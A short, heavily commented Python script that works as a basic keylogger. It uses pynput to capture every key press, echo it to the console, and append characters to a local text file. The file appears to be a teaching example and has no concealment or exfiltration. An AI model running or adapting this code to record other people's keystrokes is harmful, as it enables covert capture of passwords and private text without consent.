# Import the keyboard monitoring module from the pynput library
from pynput import keyboard

# Define the function to be called whenever a key is pressed
def keyPressed(key):
    # Print the key event to the console for immediate feedback
    print(str(key))
    
    # Open the log file in 'append' mode ('a') so previous logs aren't overwritten.
    # The 'with' statement ensures the file is properly closed after writing.
    with open('keyfile.txt', 'a') as logKey:
        try:
            # Try to get the character representation of the key.
            # This works for standard alphanumeric keys (a, 1, etc.).
            char = key.char
            # Write the character to the log file.
            logKey.write(char)
        except AttributeError:
            # If an AttributeError occurs, it means it's a special key
            # (like Shift, Ctrl, Enter) that doesn't have a `.char` attribute.
            # We just print an error message but don't log the special key,
            # which is a limitation of this simple version.
            print("Error getting char")

# This standard Python line checks if this script is being run directly
# (as opposed to being imported by another script).
if __name__ == '__main__':
    # Create a listener object that will monitor the keyboard.
    # We tell it to call our `keyPressed` function on each key press.
    listener = keyboard.Listener(on_press=keyPressed)
    
    # Start the listener. It now runs in the background.
    listener.start()
    
    # Use input() to keep the main script thread alive.
    # The program will run until the user presses Enter in the console.
    # Without this, the listener would start and then immediately stop.
    input()